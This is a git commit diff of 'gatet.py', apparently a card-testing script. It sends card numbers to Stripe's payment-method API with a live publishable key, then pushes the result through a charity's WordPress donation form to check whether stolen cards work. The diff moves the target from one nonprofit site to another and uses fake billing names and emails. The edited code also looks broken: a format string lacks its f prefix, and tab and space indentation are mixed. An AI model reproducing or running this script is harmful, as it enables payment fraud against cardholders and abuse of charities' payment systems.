a006102095935ff49d4f197f67bf701ea8203ca3
Wang Lin <maythusharmusic@gmail.com>
2025-12-22 17:16:00 +0630

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -13,68 +13,66 @@ def Tele(ccx):
 	random_amount1 = random.randint(1, 4)
 	random_amount2 = random.randint(1, 99)
 
-	headers = {
-	    'authority': 'api.stripe.com',
-	    'accept': 'application/json',
-	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'content-type': 'application/x-www-form-urlencoded',
-	    'origin': 'https://js.stripe.com',
-	    'referer': 'https://js.stripe.com/',
-	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-site',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-	}
-	
-	data = f'type=card&billing_details[name]=Gen+Paypal&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fdda83de495%3B+stripe-js-v3%2Fdda83de495%3B+card-element&key=pk_live_51IHAKHL6qXoZf0q29lYxHyPHZJNFSiu4rIZYLu2SkX2udCs8pRAj2ERKv0Zd19qvd3tdVjK2T5wgAewUdnj31Acp00lDEO8pxL'
-	
-	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-	
-	pm = response.json()['id']
-	
-	headers = {
-	    'authority': 'www.miamibeachchamber.com',
-	    'accept': 'application/json, text/javascript, */*; q=0.01',
-	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://www.miamibeachchamber.com',
-	    'referer': 'https://www.miamibeachchamber.com/education-foundation/',
-	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-	    'x-requested-with': 'XMLHttpRequest',
-	}
-	
-	data = {
-	    'action': 'wp_full_stripe_inline_donation_charge',
-	    'wpfs-form-name': 'EducationFoundationDonationTeacherGrants',
-	    'wpfs-form-get-parameters': '%7B%7D',
-	    'wpfs-custom-amount': 'other',
-	    'wpfs-custom-amount-unique': '1',
-	    'wpfs-donation-frequency': 'one-time',
-	    'wpfs-custom-input[]': '',
-	    'wpfs-billing-name': 'Gen Paypal',
-	    'wpfs-billing-address-country': 'US',
-	    'wpfs-billing-address-line-1': '27 Allen St',
-	    'wpfs-billing-address-line-2': '',
-	    'wpfs-billing-address-city': 'New York',
-	    'wpfs-billing-address-state': '',
-	    'wpfs-billing-address-state-select': 'NY',
-	    'wpfs-billing-address-zip': '10002',
-	    'wpfs-card-holder-email': 'genpaypal01@gmail.com',
-	    'wpfs-card-holder-name': 'Gen Paypal',
-	    'wpfs-stripe-payment-method-id': f'{pm}',
-	}
-	
-	response = requests.post('https://www.miamibeachchamber.com/wp-admin/admin-ajax.php', headers=headers, data=data)
-	
-	result = response.json()['message']
+    headers = {
+        'authority': 'api.stripe.com',
+        'accept': 'application/json',
+        'accept-language': 'en-US,en;q=0.9',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://js.stripe.com',
+        'referer': 'https://js.stripe.com/',
+        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+    }
+    
+    data = 'type=card&billing_details[name]=Kai+Jas&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fdda83de495%3B+stripe-js-v3%2Fdda83de495%3B+card-element&key=pk_live_X8I5Jg4Cf3h2FfLSP7fZ2JwS'
+    
+    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+    
+    pm = response.json()['id']
+    
+    headers = {
+        'Accept': 'application/json, text/javascript, */*; q=0.01',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'Origin': 'https://www.massairspace.org',
+        'Referer': 'https://www.massairspace.org/donate/',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        'X-Requested-With': 'XMLHttpRequest',
+        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+    }
+    
+    data = {
+        'action': 'wp_full_stripe_inline_donation_charge',
+        'wpfs-form-name': 'inline-donations',
+        'wpfs-form-get-parameters': '%7B%7D',
+        'wpfs-custom-amount': 'other',
+        'wpfs-custom-amount-unique': '1',
+        'wpfs-donation-frequency': 'one-time',
+        'wpfs-billing-name': 'Kai Jas',
+        'wpfs-billing-address-line-1': '27 Allen St',
+        'wpfs-billing-address-line-2': '',
+        'wpfs-billing-address-city': 'New York',
+        'wpfs-billing-address-state': 'New York',
+        'wpfs-billing-address-zip': '10002',
+        'wpfs-billing-address-country': 'US',
+        'wpfs-card-holder-email': 'ohmyqueenmedusa@gmail.com',
+        'wpfs-card-holder-name': 'Kai Jas',
+        'wpfs-stripe-payment-method-id': f'{pm}',
+    }
+    
+    response = requests.post('https://www.massairspace.org/wp-admin/admin-ajax.php', headers=headers, data=data)
+    
+    result = response.json()['message']
 	
 	return result
